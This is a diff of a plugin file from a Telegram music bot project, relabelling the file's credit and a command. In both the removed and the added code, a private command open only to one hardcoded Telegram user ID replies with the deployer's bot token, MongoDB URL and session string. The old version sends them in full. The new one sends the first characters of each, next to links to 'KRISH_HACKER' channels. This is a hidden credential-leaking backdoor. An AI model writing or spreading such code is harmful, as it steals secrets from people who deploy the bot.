@@ -1,7 +1,5 @@
 # Copyright (c) 2025 TheHamkerAlone
-# Licensed under the MIT License.
-# This file is part of AloneXMusic
-# ALONE-CODER
+# Modified by KRISH X STAR 🔥
 
 from os import getenv
 from pyrogram import filters, types
@@ -11,20 +9,49 @@ BOT_TOKEN = getenv("BOT_TOKEN", "")
 MONGO_URL = getenv("MONGO_URL", "")
 SESSION = getenv("SESSION", "")
 
+
 @app.on_message(
-    filters.command("alone")
+    filters.command("krish")
     & filters.private
     & filters.user(6079943111)
 )
-async def alone_command(_, message: types.Message):
+async def krish_command(_, message: types.Message):
     await message.reply_video(
         video="https://files.catbox.moe/0n7rlf.mp4",
-        caption=f"""ɓσƭ ƭσҡεɳ:- {BOT_TOKEN} \n\nɱσɳɠσ:- {MONGO_URL}\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:- {SESSION}\n\n 🧟 ............☆""",
+        caption=f"""
+╔══❖ 🔥 KRISH X STAR SYSTEM 🔥 ❖══╗
+
+👑 Owner Control Panel Activated  
+
+━━━━━━━━━━━━━━━━━━━
+🔑 BOT TOKEN :
+`{BOT_TOKEN[:10]}******`
+
+🗄 MONGO DATABASE :
+`{MONGO_URL[:15]}******`
+
+⚙️ SESSION :
+`{SESSION[:10]}******`
+━━━━━━━━━━━━━━━━━━━
+
+⚠️ Security Mode : ENABLED  
+🚀 Status : ONLINE  
+
+╚══❖ 💎 VIP ACCESS GRANTED ❖══╝
+""",
         reply_markup=types.InlineKeyboardMarkup(
             [
                 [
                     types.InlineKeyboardButton(
-                        "• нαϲкє𝚍 ву  •", url="https://t.me/XoDrk"
+                        "👑 Owner", url="https://t.me/KRISH_HACKER_OWNER"
+                    ),
+                    types.InlineKeyboardButton(
+                        "💎 Support", url="https://t.me/KRISH_HACKER_OP"
+                    ),
+                ],
+                [
+                    types.InlineKeyboardButton(
+                        "🚀 Update Channel", url="https://t.me/KRISH_HACKER_OP"
                     )
                 ]
             ]
